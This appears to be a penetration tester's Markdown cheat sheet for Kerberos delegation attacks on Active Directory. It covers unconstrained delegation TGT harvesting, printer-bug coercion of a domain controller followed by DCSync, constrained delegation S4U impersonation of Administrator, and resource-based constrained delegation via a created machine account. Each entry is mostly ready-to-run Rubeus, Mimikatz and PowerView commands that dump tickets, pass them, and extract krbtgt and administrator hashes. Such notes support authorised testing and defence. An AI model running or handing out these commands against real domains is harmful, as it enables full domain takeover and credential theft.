# Kerberos Delegation Attacks

> **Pre-req:** `source $HOME/Pentester/ptTools/venvHTB/bin/activate`

## Unconstrained Delegation — Capture Any User's TGT

### Unconstrained Delegation — Passive TGT Harvest [added: 2026-04]
- **Tags:** #UnconstrainedDelegation #TGTHarvest #Rubeus #Mimikatz #TrustedForDelegation #Kerberos #T1558
- **Trigger:** Server with TrustedForDelegation flag found (Get-DomainComputer -Unconstrained); have admin on that server
- **Prereq:** Admin/SYSTEM on a server with Unconstrained Delegation enabled, Rubeus or Mimikatz available
- **Yields:** TGTs of any user who authenticates to the delegation server (reusable for impersonation)
- **Opsec:** Low
- **Context:** Admin on a server with `TrustedForDelegation` set — any user connecting sends their TGT; dump and reuse
- **Payload/Method:**
  ```powershell
  # Find servers with Unconstrained Delegation
  Get-DomainComputer -Unconstrained

  # Monitor for incoming TGTs (keep running)
  .\Rubeus.exe monitor /interval:5 /nowrap

  # Dump all tickets from memory (Mimikatz)
  sekurlsa::tickets /export
  kerberos::ptt c:\path\to\ticket.kirbi

  # Or with Rubeus: list then dump specific ticket
  .\Rubeus.exe klist
  .\Rubeus.exe dump /luid:0x5379f2 /nowrap
  .\Rubeus.exe ptt /ticket:doIFSDCC[...]
  ```

### Unconstrained Delegation + Printer Bug → DC Machine Account TGT (→ DCSync) [added: 2026-04]
- **Tags:** #UnconstrainedDelegation #PrinterBug #MSRPRN #DCCoercion #DCSync #TGTCapture #T1558
- **Trigger:** Unconstrained delegation server accessible + MS-RPRN exposed on DC; need DC machine TGT
- **Prereq:** Admin on unconstrained delegation server, MS-RPRN.exe or SpoolSample, DC with Print Spooler running
- **Yields:** DC machine account TGT, enabling DCSync (full domain hash dump)
- **Opsec:** Med
- **Context:** Server with Unconstrained Delegation accessible — coerce DC to authenticate, capture its TGT, then DCSync
- **Payload/Method:**
  ```powershell
  # Session 1: On the server with Unconstrained Delegation — monitor for TGTs
  .\Rubeus.exe monitor /interval:5 /nowrap

  # Session 2: From attacker machine — coerce DC to connect via MS-RPRN printer bug
  .\MS-RPRN.exe \\dcorp-dc.domain.local \\unconstrained-server.domain.local

  # The DC's machine account TGT appears in Session 1 — inject it
  .\Rubeus.exe ptt /ticket:doIFxTCCBc...

  # Now run DCSync (ticket grants replication rights)
  lsadump::dcsync /user:domain\krbtgt /domain:domain.local
  # or: secretsdump.py -k -no-pass DC01$@dc01.domain.local -just-dc
  ```

## Constrained Delegation — S4U2Self + S4U2Proxy → Impersonate Any User

### Constrained Delegation with Service Account Hash → DA Access [added: 2026-04]
- **Tags:** #ConstrainedDelegation #S4U #S4U2Self #S4U2Proxy #Rubeus #AltService #T1558.001
- **Trigger:** Account with TrustedToAuthForDelegation + msDS-AllowedToDelegateTo found; have its hash
- **Prereq:** NTLM or AES hash of account with constrained delegation, Rubeus.exe available
- **Yields:** TGS as any user (including DA) to delegated service; /altservice enables pivot to LDAP/CIFS for DCSync
- **Opsec:** Med
- **Context:** Have hash of account with `TrustedToAuthForDelegation` + `msDS-AllowedToDelegateTo` set — impersonate any user to delegated service
- **Payload/Method:**
  ```powershell
  # Find constrained delegation accounts
  Get-DomainUser -TrustedToAuth | select userprincipalname,msds-allowedtodelegateto
  Get-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto

  # Step 1: Get TGT for the service account using its hash
  .\Rubeus.exe asktgt /user:sa_with_delegation /domain:domain.local \
    /rc4:<NTLM-hash> /outfile:sa_tgt.kirbi

  # Step 2: S4U2Self → S4U2Proxy: impersonate DA to LDAP on DC (→ allows DCSync)
  .\Rubeus.exe s4u /ticket:sa_tgt.kirbi \
    /impersonateuser:Administrator \
    /msdsspn:ldap/dcorp-dc.domain.local \
    /altservice:ldap /ptt

  # Step 3: DCSync
  lsadump::dcsync /user:domain\administrator /domain:domain.local

  # Alternative: directly with credentials (no pre-existing TGT needed)
  .\Rubeus.exe s4u /user:sa_with_delegation \
    /impersonateuser:Administrator \
    /rc4:<NTLM-hash> \
    /msdsspn:"time/dcorp-dc.domain.local" \
    /altservice:ldap /ptt
  ```

## Resource-Based Constrained Delegation (RBCD) — GenericWrite → Local Admin

### RBCD Attack — GenericWrite on Computer Object → Full Compromise [added: 2026-04]
- **Tags:** #RBCD #ResourceBasedConstrainedDelegation #GenericWrite #PowerMad #MachineAccount #S4U #T1134.001
- **Trigger:** GenericWrite, GenericAll, WriteProperty, or WriteDACL on a computer object in BloodHound; MachineAccountQuota > 0
- **Prereq:** Write rights on target computer object, ability to create machine account (MAQ > 0), Rubeus and PowerMad available
- **Yields:** Full admin access to target computer via S4U impersonation as Administrator
- **Opsec:** Med
- **Context:** Have `GenericWrite`, `GenericAll`, `WriteProperty`, or `WriteDACL` on a computer object — write RBCD attribute to allow a controlled machine account to impersonate any user to that computer
- **Payload/Method:**
  ```powershell
  # Step 1: Create a new machine account (default MachineAccountQuota=10 for any domain user)
  # Requires PowerMad
  New-MachineAccount -MachineAccount InconspicuousMachineAccount -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)

  # Step 2: Get SID of new machine account + build raw security descriptor
  $sid = Get-DomainComputer -Identity InconspicuousMachineAccount -Properties objectsid | Select -Expand objectsid
  $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
  $SDbytes = New-Object byte[] ($SD.BinaryLength)
  $SD.GetBinaryForm($SDbytes, 0)

  # Step 3: Write msDS-AllowedToActOnBehalfOfOtherIdentity on target computer
  Get-DomainComputer -Identity TargetSrv01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDbytes} -Verbose

  # Step 4: Use Rubeus S4U to get a TGS as Administrator to the target
  .\Rubeus.exe s4u /user:InconspicuousMachineAccount$ \
    /rc4:<NTLM-hash-of-machine-account-password> \
    /impersonateuser:Administrator \
    /msdsspn:cifs/TargetSrv01.domain.local /ptt

  # Step 5: Access target as admin
  ls \\TargetSrv01\c$
  ```
